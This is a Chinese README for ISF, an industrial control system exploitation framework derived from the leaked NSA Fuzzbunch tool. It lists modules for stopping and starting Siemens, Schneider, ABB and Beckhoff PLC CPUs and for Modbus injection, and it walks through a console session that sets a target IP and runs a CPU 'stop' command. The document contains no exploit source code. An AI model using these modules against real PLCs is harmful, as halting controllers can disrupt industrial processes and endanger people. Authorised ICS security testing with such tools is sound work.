
# 一、框架介绍

本框架主要使用Python语言开发，通过集成ShadowBroker释放的NSA工具Fuzzbunch攻击框架，开发一款适合工控漏洞利用的框架。由于Fuzzbunch攻击框架仅适用于Python2.6，很多核心的功能都封装成了DLL，通过函数进行调用，不便于后期的移植和使用。但是，Fuzzbunch的命令行使用的确很方便，而且够傻瓜，所以就有集成一个适合工控漏洞利用的框架想法。新框架对主要的接口使用Python重新实现，所以支持Python2.X版本。

肯定会有人问，有牛逼的MSF，搞这个玩竟儿有什么用？主要基于如下几点考虑

* MSF命令行使用不够傻瓜，纯属个人观点，仅供参考。
* 工控的很多私用协议都使用Python开发，有很多优秀的Python框架（如scapy、kitty），集成在MSF很麻烦，有一个Python的框架会方便很多。
* 最主要的一个原因是，从事工控安全以来，本人一直在使用Python，很多脚本都是基于Python开发的，想将手上所有的资源进行整合，提供一个统一的平台，方便。


# 二、依赖环境

- Python 2.7
- Works on Linux, Windows, Mac OSX, BSD


# 三、当前脚本


| Name                                   | Desc                                    |
| ---------------------------------------|:---------------------------------------:|
| Schneider_CPU_Command                  | 控制施耐德CPU启停                       |
| Siemens_300_400_CPU_Control            | 控制西门子300和400 CPU启停              |
| Siemens_1200_CPU_Control               | 控制西门子1200 CPU启停                  |
| Modbus_PLC_Injecter                    | Modbus PLC注入利用工具                  |
| plcscan                                | Modbus和S7 PLC扫描工具                  |



# 四、使用方法


    C:\Users\w.hhh>python D:/isf/isf/isf.py
    [*] Loading Plugins

                                       ???
                                 ???????????????
                              ?????           ?????
                           ????                   ????
                         ????                       ????
                        ???                           ???
                       ???             ??              ???
                      ???           ????????            ???
                     ???           ???????????           ???
                     ???          ?????????????          ???
                     ??          ???????????????          ??
                     ??         ?????????????????         ??
                     ??        ??????       ?????         ??
                     ??            ???????????            ??
                     ??            ???????????            ??
                     ??             ?????????             ??
                     ???             ???????             ???
                     ???              ?????              ???
                      ???          ???????????          ???
                       ???      ?????????????????      ???
                        ???   ????????????????????    ???
                          ?????????????????????????????
                           ???????????????????????????
                              ?????????????????????
                                 ---ICSMASTER---

    + - - - - - + [ Version 1.1.1                           ] + - - - - - +
    + - - - - - + [ 6 Touches                               ] + - - - - - +
    + - - - - - + [ 10 Exploits                             ] + - - - - - +
    + - - - - - + [ 15 Payloads                             ] + - - - - - +
    + - - - - - + [ 2 Specials                              ] + - - - - - +
    + - - - - - + [ MADE BY ICSMASTER. HTTP://ICSMASTER.COM ] + - - - - - +

## show

显示漏洞利用模块信息:

    isf > show

    Plugin Categories
    =================

      Category     Active Plugin
      --------     -------------
      Exploit      None
      Payload      None
      Special      None
      Touch        None

    isf > show Exploit

    Plugin Category: Exploit
    ========================

      Name                            Version
      ----                            -------
      ABB_CPU_Command                 1.1.0
      Beckhoff_CX9020_CPU_Control     1.1.0
      Schneider_CPU_Command           1.1.0
      Siemens_1200_CPU_Control        1.1.0
      Siemens_300_400_CPU_Control     1.1.0

    isf >

## use

使用漏洞利用模块:

    isf > use Siemens_300_400_CPU_Control

    [!] Entering Plugin Context :: Siemens_300_400_CPU_Control
    [*] Applying Global Variables

    [*] Applying Session Parameters
    [*] Running Exploit Touches


    [!] Enter Prompt Mode :: Siemens_300_400_CPU_Control

    Module: Siemens_300_400_CPU_Control
    ===================================

      Name            Value
      ----            -----
      TargetIp
      TargetPort      102
      Slot            3
      Command         stop

    [!] plugin variables are valid
    [?] Prompt For Variable Settings? [Yes] :


## info

显示漏洞脚本信息:

    isf Exploit (Siemens_300_400_CPU_Control) > info

    Information
    ===========

        Name: Siemens_300_400_CPU_Control
     Version: 1.1.0
      Author: w3h
        Type: Exploit


    Parameters
    ==========

      Name            Value      Description
      ----            -----      -----------
      TargetIp                   Target IP Address
      TargetPort      102        Target Port
      Slot            3          The number of slot
      Command         stop       The control command of cpu



## set 


    isf Exploit (Siemens_300_400_CPU_Control) > set TargetIp 127.0.0.1
    [+] Set TargetIp => 127.0.0.1

## run/execute

执行漏洞脚本:

    isf Exploit (Siemens_300_400_CPU_Control) > run

    [!] Preparing to Execute Siemens_300_400_CPU_Control

    Module: Siemens_300_400_CPU_Control
    ===================================

      Name            Value
      ----            -----
      TargetIp        127.0.0.1
      TargetPort      102
      Slot            3
      Command         stop

    [?] Execute Plugin? [Yes] :


# 三、	EXP编写

[docs/USAGE.md](https://github.com/w3h/isf/blob/master/docs/USAGE.md) 
